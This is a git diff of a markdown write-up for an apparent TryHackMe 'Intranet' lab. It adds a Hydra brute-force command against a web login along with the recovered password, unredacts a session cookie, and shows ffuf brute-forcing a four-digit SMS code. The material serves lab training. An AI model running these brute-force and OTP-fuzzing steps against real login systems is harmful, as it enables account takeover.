@@ -270,13 +270,6 @@ secu
 :~/Intranet# sed -i 's/[^a-zA-Z0-9]//g' B.txt
 ```
 
-```bash
-:~/Intranet# john --wordlist:A.txt -rules:jumbo -stdout > B.txt
-Using default input encoding: UTF-8
-Press 'q' or Ctrl-C to abort, almost any other key for status
-70539p 0:00:00:00 100.00% (2025-10-01 13:54) 641263p/s sesola
-```
-
 <h2 align="center">Hydra</h2>
 
 <p>
@@ -291,6 +284,19 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 [8080][http-post-form] host: xx.xxx.x.xxx  login: anders@securesolacoders.no   password: securesolarcoders2022
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 xx:xx:xx
+```
+
+```bash
+(rosana) :~/Intranet# hydra -l anders@securesolacoders.no -P B.txt -s 8080 xx.xxx.x.xxx http-post-form "/login:username=^USER^&password=^PASS^:Error:"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 16:42:45
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 70539 login tries (l:1/p:70539), ~4409 tries per task
+[DATA] attacking http-post-form://10.201.0.156:8080/login:username=^USER^&password=^PASS^:Error:
+[8080][http-post-form] host: 10.201.0.156   login: anders@securesolacoders.no   password: securesolacoders2022
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 16:43:08
 ```
 
 <h2 align="center">Login</h2>
@@ -333,7 +339,7 @@ Content-Type: text/html; charset=utf-8
 Content-Length: 195
 Location: /sms
 Vary: Cookie
-Set-Cookie: session=***************************.******.***************************; HttpOnly; Path=/
+Set-Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss; HttpOnly; Path=/
 Connection: close
 
 <!doctype html>
@@ -360,7 +366,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate, br
 Referer: http://intranet.thm:8080/login
 Connection: keep-alive
-Cookie: session=***************************.******.***************************
+Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
@@ -391,14 +397,6 @@ Connection: close
 ...
 ```
 
-<img width="536" height="170" alt="image" src="https://github.com/user-attachments/assets/687574a3-54d3-48e0-b12a-d3e0a0d80241" />
-
-<br>
-<br>
-<br>
-
-<img width="1272" height="366" alt="image" src="https://github.com/user-attachments/assets/f8535953-8b46-4177-865d-49619a0d4fa8" />
-
 <br>
 <br>
 
@@ -422,7 +420,7 @@ for i in {0000..9999}; do echo "$i"; done > support
 <h2 align="center">ffuf</h2>
 
 ```bash
-:~/Intranet# ffuf -u http://intranet.thm:8080/sms -c -w support -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ' -fc 200
+:~/Intranet# ffuf -u http://intranet.thm:8080/sms -c -w support -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss' -fc 200
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -438,7 +436,7 @@ ________________________________________________
  :: URL              : http://intranet.thm:8080/sms
  :: Wordlist         : FUZZ: support
  :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Header           : Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN0nAA.CLnAPZ2JQMsOgOzQ2DmOonzQJVQ
+ :: Header           : Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aN1MYA.HDa-Uv0gKSf_NwlCtudBSQmcIss
  :: Data             : sms=FUZZ
  :: Follow redirects : false
  :: Calibration      : false
@@ -448,8 +446,8 @@ ________________________________________________
  :: Filter           : Response status: 200
 ________________________________________________
 
-6285                    [Status: 302, Size: 197, Words: 18, Lines: 6]
-:: Progress: [10000/10000] :: Job [1/1] :: 625 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+8929                    [Status: 302, Size: 197, Words: 18, Lines: 6]
+:: Progress: [10000/10000] :: Job [1/1] :: 514 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
 ```
 
 <img width="1350" height="532" alt="image" src="https://github.com/user-attachments/assets/7573adfb-2e16-4a0c-8077-4f0f2f68ae68" />
@@ -465,7 +463,7 @@ ________________________________________________
 <br>
 <p>
 
-- Logged in from 10.201.17.193, a different IP from 10.201.25.116</p>
+- Logged in from xx.xxx.xx.xxx, and there is <code>Logged in from source **.***.**.***</p>
 
 <img width="1060" height="410" alt="image" src="https://github.com/user-attachments/assets/7cd44025-c3c2-4ecc-981a-8124998b9f2f" />
 
